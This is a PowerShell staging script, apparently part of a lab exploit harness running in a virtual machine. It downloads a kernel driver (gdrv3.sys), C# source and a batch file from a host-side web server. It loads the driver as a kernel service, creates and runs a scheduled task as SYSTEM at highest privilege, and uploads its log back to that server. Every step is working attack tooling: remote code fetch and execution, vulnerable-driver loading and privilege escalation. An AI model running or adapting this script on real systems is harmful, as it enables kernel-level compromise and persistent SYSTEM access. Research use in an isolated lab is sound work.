# stage3.ps1 - make the VM self-serve: C:\Users\Public\p37 harness + SYSTEM task p37run
$d = 'C:\Users\Public\p37'
$base = 'http://10.0.2.2:8080'
New-Item -ItemType Directory -Force -Path $d | Out-Null
$log = "$d\stage3.log"
$ErrorActionPreference = 'Continue'
function P([string]$m) { Write-Host $m; Add-Content -LiteralPath $log -Value ('{0} {1}' -f (Get-Date -f 'HH:mm:ss'), $m) }
function Post([string]$tag, [string]$body) {
    try { (New-Object Net.WebClient).UploadString("$base/log", ("## " + $tag + "`r`n" + $body)); P ('posted ' + $tag) }
    catch { P ('post FAIL ' + $tag + ': ' + $_.Exception.Message) }
}
Set-Content -LiteralPath $log -Value 'stage3 start'
P ('admin=' + ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
P ('temp=' + $env:TEMP)

foreach ($f in 'gdrv3.sys', 'p37_prov.cs', 'run.cmd') {
    try { (New-Object Net.WebClient).DownloadFile("$base/$f", "$d\$f"); P ('get ' + $f + ' ok') }
    catch { P ('get ' + $f + ' FAIL ' + $_.Exception.Message) }
}

$sc = @()
$sc += (& sc.exe query gdrv3 2>&1)
if (($sc -join ' ') -notmatch 'RUNNING') {
    $sc += (& sc.exe create gdrv3 type= kernel binPath= "$d\gdrv3.sys" start= demand 2>&1)
    $sc += (& sc.exe start gdrv3 2>&1)
    Start-Sleep 1
    $sc += (& sc.exe query gdrv3 2>&1)
}
$s = ($sc -join ' | ')
P ('sc: ' + $s.Substring(0, [Math]::Min(220, $s.Length)))

$t = @()
$t += (& schtasks.exe /create /tn p37run /tr "$d\run.cmd" /sc once /st 00:00 /ru SYSTEM /rl highest /f 2>&1)
P ('task: ' + ($t -join ' | '))
$t2 = (& schtasks.exe /run /tn p37run 2>&1)
P ('run: ' + ($t2 -join ' | '))
Post 'stage3' (Get-Content -LiteralPath $log -Raw)
P 'stage3 end'

